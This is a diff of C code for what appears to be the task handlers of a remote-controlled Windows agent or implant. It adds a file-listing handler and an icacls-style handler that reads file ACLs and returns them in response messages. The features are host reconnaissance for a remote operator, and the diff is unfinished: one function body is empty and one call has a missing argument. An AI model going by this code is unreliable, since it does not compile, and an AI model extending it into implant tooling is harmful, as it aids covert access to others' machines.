@@ -732,6 +732,15 @@ CLEANUP:
 	return pRespEnvelope;
 }
 
+BOOL LsHandlerCallback
+(
+	_In_ LPWSTR lpPath,
+	_In_ LPVOID lpArgs
+)
+{
+
+}
+
 PENVELOPE LsHandler
 (
 	_In_ PENVELOPE pEnvelope
@@ -740,9 +749,12 @@ PENVELOPE LsHandler
 	PPBElement pRecvElement = NULL;
 	PBUFFER* UnmarshalledData = NULL;
 	LPSTR lpPath = NULL;
+	LPWSTR lpConvertedPath = NULL;
 	LPSTR lpFileName = NULL;
 	LPSTR lpErrorDesc = NULL;
 	PENVELOPE pRespEnvelope = NULL;
+	BOOL IsFile = FALSE;
+	DWORD dwNumberOfItems = 0;
 
 	pRecvElement = ALLOC(sizeof(PBElement));
 	pRecvElement->Type = Bytes;
@@ -754,17 +766,19 @@ PENVELOPE LsHandler
 	}
 
 	lpPath = DuplicateStrA(UnmarshalledData[0]->pBuffer, 0);
-	if (!IsPathExist(lpPath)) {
+	lpConvertedPath = ConvertCharToWchar(lpPath);
+	if (!IsPathExist(lpConvertedPath)) {
 		lpErrorDesc = CreateFormattedErr(0, "%s is not exist", lpPath);
 		goto CLEANUP;
 	}
 
-	if (IsFileExist(lpPath)) {
-		PathRemoveFileSpecA(lpPath);
-		lpFileName = &lpPath[lstrlenA(lpPath) + 1];
+	if (IsFileExist(lpConvertedPath)) {
+		
 	}
-
-
+	else {
+		dwNumberOfItems = GetChildItemCount(lpConvertedPath);
+		ListFileEx(lpConvertedPath, 0, );
+	}
 
 CLEANUP:
 	if (lpErrorDesc != NULL) {
@@ -792,6 +806,7 @@ PENVELOPE IcaclsHandler
 	PPBElement pRecvElement = NULL;
 	PBUFFER* UnmarshalledData = NULL;
 	LPSTR lpPath = NULL;
+	LPWSTR lpTempPath = NULL;
 	LPSTR lpErrorDesc = NULL;
 	PENVELOPE pRespEnvelope = NULL;
 	PACL pAcl = NULL;
@@ -801,6 +816,7 @@ PENVELOPE IcaclsHandler
 	LPSTR lpSidName = NULL;
 	LPSTR lpRespData = NULL;
 	DWORD dwMask = 0;
+	PPBElement pFinalElement = NULL;
 
 	pRecvElement = ALLOC(sizeof(PBElement));
 	pRecvElement->Type = Bytes;
@@ -812,12 +828,13 @@ PENVELOPE IcaclsHandler
 	}
 
 	lpPath = DuplicateStrA(UnmarshalledData[0]->pBuffer, 0);
-	if (!IsPathExist(lpPath)) {
+	lpTempPath = ConvertCharToWchar(lpPath);
+	if (!IsPathExist(lpTempPath)) {
 		lpErrorDesc = CreateFormattedErr(0, "%s is not exist", lpPath);
 		goto CLEANUP;
 	}
 
-	pAcl = GetFileSecurityDescriptor(lpPath);
+	pAcl = GetFileDacl(lpTempPath);
 	pAceHdr = (PACE_HEADER)(&pAcl[1]);
 	for (i = 0; i < pAcl->AceCount; i++) {
 		pSid = (PSID)((ULONG_PTR)pAceHdr + 8);
@@ -846,7 +863,7 @@ PENVELOPE IcaclsHandler
 		}
 
 		if (pAceHdr->AceFlags & INHERIT_ONLY_ACE) {
-			lpRespData = StrCatExA(lpRespData, "(CI)");
+			lpRespData = StrCatExA(lpRespData, "(IO)");
 		}
 
 		if (pAceHdr->AceFlags & CRITICAL_ACE_FLAG) {
@@ -859,90 +876,178 @@ PENVELOPE IcaclsHandler
 		}
 
 		lpRespData = StrCatExA(lpRespData, "(");
-		if (dwMask & DELETE) {
-			lpRespData = StrCatExA(lpRespData, "DE, ");
+		if (pAceHdr->AceType < SYSTEM_AUDIT_ACE_TYPE || (pAceHdr->AceType > SYSTEM_SCOPED_POLICY_ID_ACE_TYPE && pAceHdr->AceType <= SYSTEM_ACCESS_FILTER_ACE_TYPE)) {
+			if (dwMask == 0x1F01FF || dwMask == GENERIC_ALL) {
+				if (pAceHdr->AceType == ACCESS_ALLOWED_ACE_TYPE) {
+					lpRespData = StrCatExA(lpRespData, "F,");
+				}
+				else {
+					lpRespData = StrCatExA(lpRespData, "N,");
+				}
+
+				dwMask = 0;
+			}
+
+			if ((dwMask & 0x1301BF) == 0x1301BF) {
+				lpRespData = StrCatExA(lpRespData, "M,");
+				dwMask &= ~0x1301BF;
+			}
+
+			if ((dwMask & 0x1200A9) == 0x1200A9) {
+				lpRespData = StrCatExA(lpRespData, "RX,");
+				dwMask &= ~0x1200A9;
+			}
+			else if ((dwMask & 0x120089) == 0x120089) {
+				lpRespData = StrCatExA(lpRespData, "R,");
+				dwMask &= ~0x120089;
+			}
+
+			if ((dwMask & 0x100116) == 0x100116) {
+				lpRespData = StrCatExA(lpRespData, "W,");
+				dwMask &= ~0x100116;
+			}
+
+			if ((dwMask & 0xE0010000) == 0xE0010000) {
+				lpRespData = StrCatExA(lpRespData, "M,");
+				dwMask &= ~0xE0010000;
+			}
+
+			if ((dwMask & 0x110000) == 0x110000) {
+				lpRespData = StrCatExA(lpRespData, "D,");
+				dwMask &= ~0x110000;
+			}
+		}
+		else if (pAceHdr->AceType == SYSTEM_MANDATORY_LABEL_ACE_TYPE) {
+			if (dwMask & 1) {
+				lpRespData = StrCatExA(lpRespData, "NW,");
+				dwMask &= ~1;
+			}
+
+			if (dwMask & 2) {
+				lpRespData = StrCatExA(lpRespData, "NR,");
+				dwMask &= ~2;
+			}
+
+			if (dwMask & 4) {
+				lpRespData = StrCatExA(lpRespData, "NX,");
+				dwMask &= ~4;
+			}
 		}
 
-		if (dwMask & READ_CONTROL) {
-			lpRespData = StrCatExA(lpRespData, "Rc, ");
+		if ((dwMask & DELETE) == DELETE) {
+			lpRespData = StrCatExA(lpRespData, "DE,");
+			dwMask &= ~DELETE;
 		}
 
-		if (dwMask & WRITE_DAC) {
-			lpRespData = StrCatExA(lpRespData, "WDAC, ");
+		if ((dwMask & READ_CONTROL) == READ_CONTROL) {
+			lpRespData = StrCatExA(lpRespData, "Rc,");
+			dwMask &= ~READ_CONTROL;
 		}
 
-		if (dwMask & WRITE_OWNER) {
-			lpRespData = StrCatExA(lpRespData, "WO, ");
+		if ((dwMask & WRITE_DAC) == WRITE_DAC) {
+			lpRespData = StrCatExA(lpRespData, "WDAC,");
+			dwMask &= ~WRITE_DAC;
 		}
 
-		if (dwMask & SYNCHRONIZE) {
-			lpRespData = StrCatExA(lpRespData, "S, ");
+		if ((dwMask & WRITE_OWNER) == WRITE_OWNER) {
+			lpRespData = StrCatExA(lpRespData, "WO,");
+			dwMask &= ~WRITE_OWNER;
 		}
 
-		if (dwMask & ACCESS_SYSTEM_SECURITY) {
-			lpRespData = StrCatExA(lpRespData, "AS, ");
+		if ((dwMask & SYNCHRONIZE) == SYNCHRONIZE) {
+			lpRespData = StrCatExA(lpRespData, "S,");
+			dwMask &= ~SYNCHRONIZE;
 		}
 
-		if (dwMask & MAXIMUM_ALLOWED) {
-			lpRespData = StrCatExA(lpRespData, "MA, ");
+		if ((dwMask & ACCESS_SYSTEM_SECURITY) == ACCESS_SYSTEM_SECURITY) {
+			lpRespData = StrCatExA(lpRespData, "AS,");
+			dwMask &= ~ACCESS_SYSTEM_SECURITY;
 		}
 
-		if (dwMask & GENERIC_READ) {
-			lpRespData = StrCatExA(lpRespData, "GR, ");
+		if ((dwMask & MAXIMUM_ALLOWED) == MAXIMUM_ALLOWED) {
+			lpRespData = StrCatExA(lpRespData, "MA,");
+			dwMask &= ~MAXIMUM_ALLOWED;
 		}
 
-		if (dwMask & GENERIC_WRITE) {
-			lpRespData = StrCatExA(lpRespData, "GW, ");
+		if ((dwMask & GENERIC_READ) == GENERIC_READ) {
+			lpRespData = StrCatExA(lpRespData, "GR,");
+			dwMask &= ~GENERIC_READ;
 		}
 
-		if (dwMask & GENERIC_EXECUTE) {
-			lpRespData = StrCatExA(lpRespData, "GE, ");
+		if ((dwMask & GENERIC_WRITE) == GENERIC_WRITE) {
+			lpRespData = StrCatExA(lpRespData, "GW,");
+			dwMask &= ~GENERIC_WRITE;
 		}
 
-		if (dwMask & GENERIC_ALL) {
-			lpRespData = StrCatExA(lpRespData, "GA, ");
+		if ((dwMask & GENERIC_EXECUTE) == GENERIC_EXECUTE) {
+			lpRespData = StrCatExA(lpRespData, "GE,");
+			dwMask &= ~GENERIC_EXECUTE;
 		}
 
-		if (dwMask & FILE_READ_DATA) {
-			lpRespData = StrCatExA(lpRespData, "RD, ");
+		if ((dwMask & GENERIC_ALL) == GENERIC_ALL) {
+			lpRespData = StrCatExA(lpRespData, "GA,");
+			dwMask &= ~GENERIC_ALL;
 		}
 
-		if (dwMask & FILE_WRITE_DATA) {
-			lpRespData = StrCatExA(lpRespData, "WD, ");
+		if ((dwMask & FILE_READ_DATA) == FILE_READ_DATA) {
+			lpRespData = StrCatExA(lpRespData, "RD,");
+			dwMask &= ~FILE_READ_DATA;
 		}
 
-		if (dwMask & FILE_APPEND_DATA) {
-			lpRespData = StrCatExA(lpRespData, "AD, ");
+		if ((dwMask & FILE_WRITE_DATA) == FILE_WRITE_DATA) {
+			lpRespData = StrCatExA(lpRespData, "WD,");
+			dwMask &= ~FILE_WRITE_DATA;
 		}
 
-		if (dwMask & FILE_READ_EA) {
-			lpRespData = StrCatExA(lpRespData, "REA, ");
+		if ((dwMask & FILE_APPEND_DATA) == FILE_APPEND_DATA) {
+			lpRespData = StrCatExA(lpRespData, "AD,");
+			dwMask &= ~FILE_APPEND_DATA;
 		}
 
-		if (dwMask & FILE_WRITE_EA) {
-			lpRespData = StrCatExA(lpRespData, "WEA, ");
+		if ((dwMask & FILE_READ_EA) == FILE_READ_EA) {
+			lpRespData = StrCatExA(lpRespData, "REA,");
+			dwMask &= ~FILE_READ_EA;
 		}
 
-		if (dwMask & FILE_EXECUTE) {
-			lpRespData = StrCatExA(lpRespData, "X, ");
+		if ((dwMask & FILE_WRITE_EA) == FILE_WRITE_EA) {
+			lpRespData = StrCatExA(lpRespData, "WEA,");
+			dwMask &= ~FILE_WRITE_EA;
 		}
 
-		if (dwMask & FILE_DELETE_CHILD) {
-			lpRespData = StrCatExA(lpRespData, "DC, ");
+		if ((dwMask & FILE_EXECUTE) == FILE_EXECUTE) {
+			lpRespData = StrCatExA(lpRespData, "X,");
+			dwMask &= ~FILE_EXECUTE;
 		}
 
-		if (dwMask & FILE_READ_ATTRIBUTES) {
-			lpRespData = StrCatExA(lpRespData, "RA, ");
+		if ((dwMask & FILE_DELETE_CHILD) == FILE_DELETE_CHILD) {
+			lpRespData = StrCatExA(lpRespData, "DC,");
+			dwMask &= ~FILE_DELETE_CHILD;
 		}
 
-		if (dwMask & FILE_WRITE_ATTRIBUTES) {
-			lpRespData = StrCatExA(lpRespData, "WA, ");
+		if ((dwMask & FILE_READ_ATTRIBUTES) == FILE_READ_ATTRIBUTES) {
+			lpRespData = StrCatExA(lpRespData, "RA,");
+			dwMask &= ~FILE_READ_ATTRIBUTES;
 		}
 
-		lpRespData[lstrlenA(lpRespData) - 2] = '\0';
+		if ((dwMask & FILE_WRITE_ATTRIBUTES) == FILE_WRITE_ATTRIBUTES) {
+			lpRespData = StrCatExA(lpRespData, "WA,");
+			dwMask &= ~FILE_WRITE_ATTRIBUTES;
+		}
+
+		lpRespData[lstrlenA(lpRespData) - 1] = ')';
+		lpRespData = StrCatExA(lpRespData, "\n");
 		pAceHdr = (PACE_HEADER)((ULONG_PTR)pAceHdr + pAceHdr->AceSize);
 	}
 
+	printf("%s\n", lpRespData);
+	pFinalElement = CreateBytesElement(lpRespData, lstrlenA(lpRespData), 1);
+	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
+	pRespEnvelope->uID = pEnvelope->uID;
+	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
+	pRespEnvelope->pData->pBuffer = pFinalElement->pMarshalledData;
+	pRespEnvelope->pData->cbBuffer = pFinalElement->cbMarshalledData;
+	pFinalElement->pMarshalledData = NULL;
+	pFinalElement->cbMarshalledData = 0;
 CLEANUP:
 	if (lpErrorDesc != NULL) {
 		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
@@ -962,11 +1067,18 @@ CLEANUP:
 		FREE(pAcl);
 	}
 
+	if (lpTempPath != NULL) {
+		FREE(lpTempPath);
+	}
+
 	if (lpRespData != NULL) {
 		FREE(lpRespData);
 	}
 
 	FreeElement(pRecvElement);
+	FreeElement(pFinalElement);
+
+	return pRespEnvelope;
 }
 
 #define PH_NEXT_PROCESS(Process) ( \
@@ -2463,6 +2575,9 @@ VOID MainHandler
 	}
 	else if (pEnvelope->uType == MsgListWasmExtensionsReq) {
 
+	}
+	else if (pEnvelope->uType == MsgIcaclsReq) {
+		pResp = IcaclsHandler(pEnvelope);
 	}
 	else {
 
